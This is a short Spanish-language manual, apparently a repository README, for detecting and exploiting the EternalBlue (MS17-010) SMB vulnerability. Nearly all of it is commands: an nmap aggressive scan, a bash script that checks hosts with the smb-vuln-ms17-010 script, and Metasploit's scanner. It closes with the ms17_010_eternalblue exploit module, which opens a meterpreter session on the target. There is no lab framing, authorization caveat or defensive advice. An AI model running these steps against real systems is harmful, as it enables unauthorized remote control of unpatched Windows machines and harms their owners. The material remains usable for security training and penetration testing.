# Manual-Eternalblue
Detección y explotación de la vulnerabilidad EternalBlue

La vulnerabilidad en la implementación de SMB permite a los atacantes acceder y controlar un equipo remotamente.


MANUAL:

Escaneo agresivo con nmap
Sintaxis:

```cmd
nmap -A "host"
```
Script para detectar si un host tiene la vulnerabilidad de eternalblue con nmap en bash:

```cmd
#!/bin/bash


echo "ingrese direccion ip del objetivo"
read ip
if nmap -p445 --script smb-vuln-ms17-010.nse $ip | grep "VULNERABLE"; then
  echo "Host es vulnerable a EternalBlue (MS17-010)"
else
  echo "Host no es vulnerable a EternalBlue (MS17-010)"
fi
```

iniciar Metasploit Framework

```cmd
service postgresql start
```

```cmd
msfconsole
```

Usar un modulo auxiliar de metasploit para detectar si un host cuenta con la vulnerabilidad de eternalblue

```cmd
use auxiliary/scanner/smb/smb_ms17_010
```
configurar hosts

```cmd
set RHOSTS "host"
```
ejecutar

```cmd
run
```
Ejecutar un modulo de tipo exploit para generar una consola de meterpreter al host vulnerable

```cmd
use exploit/windows/smb/ms17_010_eternalblue
```
configurar host

```cmd
set RHOSTS "host"
```

Ejecutar

```cmd
exploit
```